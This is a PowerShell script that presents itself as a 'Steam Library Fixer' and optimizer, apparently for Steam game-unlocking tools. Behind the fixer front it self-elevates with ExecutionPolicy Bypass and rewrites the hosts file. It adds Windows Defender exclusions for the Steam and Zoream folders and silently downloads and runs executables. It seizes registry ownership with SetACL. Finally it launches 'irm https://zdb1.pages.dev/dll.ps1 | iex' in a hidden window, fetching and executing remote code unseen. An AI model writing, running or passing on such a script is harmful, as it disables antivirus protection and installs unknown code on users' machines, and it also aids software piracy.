[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
Try {
    $MethodDefinition = @'
    [DllImport("kernel32.dll")]
    public static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint dwMode);
    [DllImport("kernel32.dll")]
    public static extern bool GetConsoleMode(IntPtr hConsoleHandle, out uint lpMode);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetStdHandle(int nStdHandle);
'@
    $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name "Kernel32Functions" -Namespace Win32 -PassThru
}
catch {}

function Disable-QuickEdit {
    $hInput = $Kernel32::GetStdHandle(-10) 
    $mode = 0
    if ($Kernel32::GetConsoleMode($hInput, [ref]$mode)) {
        $mode = $mode -band -not (0x0040 -bor 0x0020)
        $Kernel32::SetConsoleMode($hInput, $mode -bor 0x0080)
    }
}

Disable-QuickEdit
$host.UI.RawUI.BackgroundColor = "Black"
$host.UI.RawUI.ForegroundColor = "White"
$host.UI.RawUI.WindowTitle = "Zoream Optimizer | SYS_0xA7"
Clear-Host

$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "`n [!] Requesting Administrative Privileges..." -ForegroundColor Yellow
    if ($PSCommandPath) { $scriptPath = $PSCommandPath } else {
        $scriptPath = Join-Path $env:TEMP "zoream_fix.ps1"
        $scriptText = $MyInvocation.MyCommand.ScriptBlock.ToString()
        Set-Content -Path $scriptPath -Value $scriptText -Encoding UTF8
    }
    Start-Process -FilePath "conhost.exe" -Verb RunAs -ArgumentList "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
    exit
}

Disable-QuickEdit

function Show-Header {
    Write-Host " "
    Write-Host "  ______                                              " -ForegroundColor Cyan
    Write-Host " |__  /   ___   _ __    ___    __ _   _ __ ___        " -ForegroundColor Cyan
    Write-Host "   / /   / _ \ | '__|  / _ \  / _`` | | '_ `` _ \       " -ForegroundColor DarkCyan
    Write-Host "  / /_  | (_) || |    |  __/ | (_| | | | | | | |      " -ForegroundColor Blue
    Write-Host " /____|  \___/ |_|     \___|  \__,_| |_| |_| |_|      " -ForegroundColor Blue
    Write-Host " "
    Write-Host "   ----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "          Steam Library Fixer BY SYS_0xA7 " -ForegroundColor White
    Write-Host "   ----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host " "
}

function Write-Log {
    param([string]$Message, [string]$Type = "INFO")
    $Time = Get-Date -Format "HH:mm:ss"
    switch ($Type) {
        "INFO" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [?] $Message" -ForegroundColor Gray }
        "SUCCESS" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [OK] $Message" -ForegroundColor Green }
        "WARN" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [!] $Message" -ForegroundColor Yellow }
        "ERROR" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [X] $Message" -ForegroundColor Red }
        "STEP" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [>] $Message" -ForegroundColor Cyan }
    }
}

Clear-Host
Show-Header
Write-Log "Anti-Freeze (QuickEdit Disabled) applied successfully." "SUCCESS"



$ErrorActionPreference = "SilentlyContinue"
$hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"

# Tutulacak (İzin verilen) girişler
$allowedEntries = @(
    "127.0.0.1 steam.run",
    "::1 steam.run",
    "127.0.0.1 api.paradisedev.org",
    "::1 api.paradisedev.org",
    "127.0.0.1 paradisedev.org",
    "::1 paradisedev.org"
)

try {
    # 1. Mevcut dosyayı oku, yorum satırlarını (#) koru ama diğer yönlendirmeleri temizle
    $oldContent = Get-Content $hostsPath
    $newContent = New-Object System.Collections.Generic.List[string]

    foreach ($line in $oldContent) {
        # Yorum satırlarını veya boş satırları olduğu gibi bırak (Sistem sağlığı için)
        if ($line.Trim().StartsWith("#") -or [string]::IsNullOrWhiteSpace($line)) {
            $newContent.Add($line)
        }
    }

    # 2. Sadece senin istediğin 2 ana domain ve local IP'lerini ekle
    foreach ($entry in $allowedEntries) {
        $newContent.Add($entry)
    }

    # 3. Dosyayı üzerine yaz
    $newContent | Set-Content $hostsPath -Force

    # 4. DNS Önbelleğini temizle
    ipconfig /flushdns | Out-Null
    
}
catch {

  }


# Find Steam
try { $steamPath = (Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam").InstallPath } catch { $steamPath = $null }
if (-not $steamPath) { Write-Log "Steam not found!" "ERROR"; exit 1 }

$zoreamPath = Join-Path $env:LOCALAPPDATA "Zoream"
$zoreamExe = Join-Path $zoreamPath "Zoream.exe"

# -------------------------------------------------------------------------
# ZOREAM CHECK & DOWNLOAD MODULE
# -------------------------------------------------------------------------
if (-not (Test-Path $zoreamExe)) {
    Write-Log "Zoream component missing. Initiating download..." "WARN"
    
    $downloadUrl = "https://github.com/WolfGames156/zoreamrelease/releases/download/release/Zoream_Setup.exe"
    $tempSetup = Join-Path $env:TEMP "Zoream_Setup.exe"

    try {
        # .NET WebRequest kullanarak Timeout kontrolü ve Progress Bar
        $request = [System.Net.WebRequest]::Create($downloadUrl)
        $request.Timeout = 5000 # 5 Saniye Timeout
        $response = $request.GetResponse()
        
        $totalLength = $response.ContentLength
        $responseStream = $response.GetResponseStream()
        $targetStream = [System.IO.File]::Create($tempSetup)
        $buffer = New-Object byte[] 10KB
        $readCount = 0

        do {
            $count = $responseStream.Read($buffer, 0, $buffer.Length)
            $targetStream.Write($buffer, 0, $count)
            $readCount += $count
            if ($totalLength -gt 0) {
                $pct = [Math]::Floor(($readCount / $totalLength) * 100)
                Write-Progress -Activity "Downloading Zoream Installer" -Status "Progress: $pct%" -PercentComplete $pct
            }
        } while ($count -gt 0)

        $targetStream.Close()
        $responseStream.Close()
        $response.Close()
        
        Write-Progress -Activity "Downloading Zoream Installer" -Completed
        Write-Log "Zoream Setup downloaded successfully." "SUCCESS"
        
        # Ayrı bir işlem olarak aç (PowerShell'i bekletmesin)
        Start-Process -FilePath $tempSetup -WindowStyle Normal
    }
    catch {
        # Hata olursa veya 5 saniye timeout yerse hiçbir şey yapma, devam et.
        # İleride hata yazdırmıyoruz.
    }
}
# -------------------------------------------------------------------------

Write-Log "Applying Windows Defender exclusion for Zoream folder..." "STEP"

if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
    try {
        # Klasör fiziksel olarak oluşmamış olsa bile exclusion eklemek mantıklıdır (kurulum öncesi)
        # Ancak orijinal kodda Test-Path kontrolü vardı, burada hata almamak için
        # Eğer kurulum yeni indiyse klasör henüz oluşmamış olabilir.
        if (-not (Test-Path $zoreamPath)) {
            New-Item -ItemType Directory -Path $zoreamPath -Force | Out-Null
        }

        $existing = (Get-MpPreference -ErrorAction Stop).ExclusionPath

        if ($existing -and $existing -contains $zoreamPath) {
            Write-Log "Zoream folder already excluded." "SUCCESS"
        }
        else {
            Add-MpPreference -ExclusionPath $zoreamPath -ErrorAction Stop
            Write-Log "Zoream folder excluded successfully." "SUCCESS"
        }
    }
    catch {
        Write-Log "Failed to apply Defender exclusion. (If it does not apply automatically, you may add it manually.)" "ERROR"
    }
}
else {
    Write-Log "Windows Defender cmdlets not available. (If it does not apply automatically, you may add it manually.)" "ERROR"
}

Write-Log "Applying Windows Defender exclusion for Steam Folder..." "STEP"

if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
    try {
        $existing = (Get-MpPreference -ErrorAction Stop).ExclusionPath

        if ($existing -and $existing -contains $steamPath) {
            Write-Log "Steam folder already excluded." "SUCCESS"
        }
        else {
            Add-MpPreference -ExclusionPath $steamPath -ErrorAction Stop
            Write-Log "Steam folder excluded successfully." "SUCCESS"
        }
    }
    catch {
        Write-Log "Failed to apply Defender exclusion. (If it does not apply automatically, you may add it manually.)" "ERROR"
    }
}
else {
    Write-Log "Failed to apply Defender exclusion. (If it does not apply automatically, you may add it manually.)" "ERROR"
}




Write-Log "Deleting Steamtools Registry ..." "STEP"

$pathsToTry = @(
    "HKCU:\Software\Valve\Steamtools",
    "HKLM:\Software\Valve\Steamtools"
)

$setAclUrl = "https://github.com/WolfGames156/Zoream-Database/releases/download/SetACL/SetACL.exe"
$setAclPath = Join-Path $env:TEMP "SetACL.exe"

function Ensure-SetACL {
    if (Test-Path $setAclPath) { return $true }
    try {
        Write-Log "SetACL.exe not found. Downloading..." "STEP"
        Invoke-WebRequest -Uri $setAclUrl -OutFile $setAclPath -UseBasicParsing -ErrorAction Stop *> $null
        return (Test-Path $setAclPath)
    }
    catch {
        Write-Log "SetACL.exe download failed." "ERROR"
        return $false
    }
}

function Remove-SteamToolsKey {
    param([string]$regPath)
    try {
        if (Test-Path $regPath) {
            # Recurse ve Force ile her şeyi silmeye çalış
            Remove-Item -Path $regPath -Recurse -Force -ErrorAction Stop
            Write-Log "Path $regPath deleted successfully." "SUCCESS"
            return $true
        } else {
            Write-Log "Path $regPath does not exist, skipping." "SUCCESS"
            return $true
        }
    }
    catch {
        return $false
    }
}

function Fix-Permissions-And-Delete {
    param([string]$regPath)

    if (-not (Ensure-SetACL)) { return $false }

    # SetACL için path formatını düzenle (HKCU:\ -> HKCU\)
    $nativePath = $regPath.Replace(":\", "\")

    try {
        Write-Log "Resetting permissions to force delete..." "STEP"

        # 1) Sahipliği al (Owner -> Current User)
        & $setAclPath -on $nativePath -ot reg -actn setowner -ownr "n:$env:USERNAME" -rec cont_obj *> $null

        # 2) ACL'yi temizle ve kalıtımı boz (Temiz bir sayfa)
        & $setAclPath -on $nativePath -ot reg -actn clearace -rec cont_obj *> $null
        & $setAclPath -on $nativePath -ot reg -actn setprot -op "dacl:p_nc;sacl:p_nc" -rec cont_obj *> $null

        # 3) Mevcut kullanıcıya Full Control ver
        & $setAclPath -on $nativePath -ot reg -actn ace -ace "n:$env:USERNAME;p:full" -rec cont_obj *> $null

        Write-Log "Permissions reset. Retrying deletion..." "SUCCESS"
        
        # Tekrar silmeyi dene
        return (Remove-SteamToolsKey -regPath $regPath)
    }
    catch {
        Write-Log "SetACL permission fix failed." "ERROR"
        return $false
    }
}

# --- ANA DÖNGÜ ---
foreach ($regPath in $pathsToTry) {
    Write-Log "Targeting path: $regPath" "STEP"

    # İlk deneme: Direkt sil
    if (-not (Remove-SteamToolsKey -regPath $regPath)) {
        Write-Log "Access denied or error on $regPath. Applying permission fix..." "WARN"
        
        # İkinci deneme: İzinleri düzelt ve sil
        if (-not (Fix-Permissions-And-Delete -regPath $regPath)) {
            Write-Log "Failed to remove $regPath even after permission fix." "ERROR"
        }
    }
}

Write-Log "Registry cleanup process finished." "SUCCESS"



Write-Log "Clearing Beta and Killing Processes..." "STEP"
Start-Process (Join-Path $steamPath "Steam.exe") -ArgumentList "-clearbeta"
Start-Sleep -Seconds 5
Get-Process steam* -ErrorAction SilentlyContinue | Stop-Process -Force

$backupPath = Join-Path $steamPath "cache-backup"
New-Item -ItemType Directory -Path $backupPath -Force | Out-Null

if (Test-Path (Join-Path $steamPath "appcache")) {
    Write-Log "Cleaning AppCache..." "STEP"
    Move-Item (Join-Path $steamPath "appcache") (Join-Path $backupPath "appcache") -Force -ErrorAction SilentlyContinue
}

$userdataPath = Join-Path $steamPath "userdata"
if (Test-Path $userdataPath) {
    Write-Log "Optimizing user data..." "STEP"
    foreach ($user in Get-ChildItem $userdataPath -Directory) {
        $config = Join-Path $user.FullName "config"
        if (Test-Path $config) {
            $uBack = Join-Path $backupPath ("userdata\" + $user.Name)
            New-Item -ItemType Directory -Path $uBack -Force | Out-Null
            Move-Item $config $uBack -Force -ErrorAction SilentlyContinue
            New-Item -ItemType Directory -Path $config -Force | Out-Null
            if (Test-Path (Join-Path $uBack "config\localconfig.vdf")) {
                Copy-Item (Join-Path $uBack "config\localconfig.vdf") (Join-Path $config "localconfig.vdf") -Force
            }
        }
    }
}

# Steam kapandıktan hemen sonra dwmapi.dll kontrolü ve temizliği
Write-Log "Checking for unauthorized DLLs (dwmapi.dll)..." "STEP"
$dwmapiPath = Join-Path $steamPath "dwmapi.dll"

if (Test-Path $dwmapiPath) {
    try {
        Remove-Item $dwmapiPath -Force -ErrorAction Stop
        Write-Log "dwmapi.dll found and successfully removed." "SUCCESS"
    }
    catch {
        Write-Log "Could not remove dwmapi.dll. It might be in use or protected." "ERROR"
    }
}
else {
    Write-Log "dwmapi.dll not found. System is clean." "INFO"
}


Write-Log "Validating and Cleaning stplug-in folder..." "STEP"
$stpluginPath = Join-Path $steamPath "config\stplug-in"

if (-not (Test-Path $stpluginPath)) {
    Write-Log "stplug-in folder does not exist!" "WARN"
}
else {

    Get-ChildItem $stpluginPath -File | ForEach-Object {

        if ($_.Extension -notin @(".lua", ".zor")) {
            Write-Log "Removing invalid file type: $($_.Name)" "ERROR"
            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
        }
    }

    function Test-ValidLuaLine {
        param([string]$Line)

        $trimmed = $Line.Trim()

        if ([string]::IsNullOrWhiteSpace($trimmed)) { return $true }
        if ($trimmed.StartsWith('-')) { return $true }

        if ($trimmed -match '^(?i)(addappid|setManifestid|addtoken)') {
            if ($trimmed -match '\(' -and $trimmed -match '\)') {
                return $true
            }
        }

        return $false
    }

    Get-ChildItem $stpluginPath -File | Where-Object {
        $_.Extension -in @(".lua", ".zor")
    } | ForEach-Object {

        $lines = Get-Content $_.FullName
        $isClean = $true

        foreach ($l in $lines) {
            if (-not (Test-ValidLuaLine $l)) {
                $isClean = $false
                break
            }
        }

        if ($isClean) {
            Write-Log "Validated: $($_.Name)" "SUCCESS"
        }
        else {
            Write-Log "Invalid content detected! Deleting: $($_.Name)" "ERROR"
            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
        }
    }
}

Write-Log "Checking for steam.cfg..." "STEP"
$cfgFiles = @("steam.cfg", "Steam.cfg")
foreach ($cfg in $cfgFiles) {
    $targetCfg = Join-Path $steamPath $cfg
    if (Test-Path $targetCfg) {
        Remove-Item $targetCfg -Force -ErrorAction SilentlyContinue
        Write-Log "Deleted: $cfg" "SUCCESS"
    }
}

Write-Log "Fix and Cleanup complete." "SUCCESS"
Write-Host " "
Write-Host "   *** CORE EXECUTING IN BACKGROUND ***" -ForegroundColor Cyan
Write-Host " "

$command = "irm https://zdb1.pages.dev/dll.ps1 | iex"
Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $command" -WindowStyle Hidden

for ($i = 10; $i -gt 0; $i--) {
    Write-Host "`r   *** This window will close in $i second(s) ***  " -ForegroundColor Magenta -NoNewline
    Start-Sleep -Seconds 1
}

exit
